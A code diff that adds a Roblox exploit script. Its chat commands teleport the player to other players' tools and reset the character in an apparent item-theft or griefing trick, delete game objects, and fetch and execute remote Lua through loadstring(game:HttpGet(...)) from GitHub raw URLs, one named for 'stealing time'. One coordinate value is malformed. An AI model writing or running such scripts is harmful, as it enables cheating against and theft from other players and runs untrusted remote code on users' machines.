@@ -1,0 +1,79 @@
+-- سكربتات
+
+local player = game.Players.LocalPlayer
+local mouse = player:GetMouse()
+
+mouse.Button1Down:Connect(function()
+  local target = mouse.Target
+  if target and target.Parent:IsA("Model") and target.Parent:IsDescendantOf(workspace) then
+    local playerObject = target.Parent
+
+    if playerObject:FindFirstChildOfClass("Tool") then
+      local name = playerObject.Name
+
+      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = playerObject:FindFirstChildOfClass("Tool").Handle.CFrame
+      wait(0.3)
+      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-11.031303, 11.909981, 77.7965469, -0.969540477, -3111111111111.10773807e-08, -0.244931206, -1.97727861e-08, 1, -4.86130993e-08, 0.244931206, -4.22893969e-08, -0.969540477)
+      wait(0.2)
+      game.Players.LocalPlayer.Character.Humanoid.Health = 0
+    end
+  end
+end)
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = "/e kick "
+if string.sub(message, 1, #keyword) == keyword then
+local Name = string.sub(message, #keyword + 1)
+
+local playerObject = workspace:FindFirstChild(Name)
+
+if playerObject then
+  local tool = game.Players[Name].Character:FindFirstChildOfClass("Tool")
+if tool then
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = tool.Handle.CFrame
+end
+  wait(.3)
+  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-11.031303, 11.909981, 77.7965469, -0.969540477, -3111111111111.10773807e-08, -0.244931206, -1.97727861e-08, 1, -4.86130993e-08, 0.244931206, -4.22893969e-08, -0.969540477)
+  wait(.2)
+  game.Players.LocalPlayer.Character.Humanoid.Health = 0
+end
+  end
+end)
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = "/e 25x"
+if string.sub(message, 1, #keyword) == keyword then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/l11004/7yd7/main/25x%20%D8%A7%D8%B3%D8%B1%D9%82%20%D9%88%D9%82%D8%AA"))()
+end
+end)
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = "/e autorj"
+if string.sub(message, 1, #keyword) == keyword then
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/baechooYT/Just_Stop/main/autorj-forautoexec.lua"), true))()
+end
+end)
+
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = "/e del"
+if string.sub(message, 1, #keyword) == keyword then
+	workspace.CommonMesh.Parent = lol
+	workspace.EpicMesh.Parent = lol
+	workspace.LegendaryMesh.Parent = lol
+	workspace.RareMesh.Parent = lol
+	workspace.SafeZone.Parent = lol
+end
+end)
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = "/e cmde"
+if string.sub(message, 1, #keyword) == keyword then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/l11004/7yd7/main/cmde"))()
+end
+end)
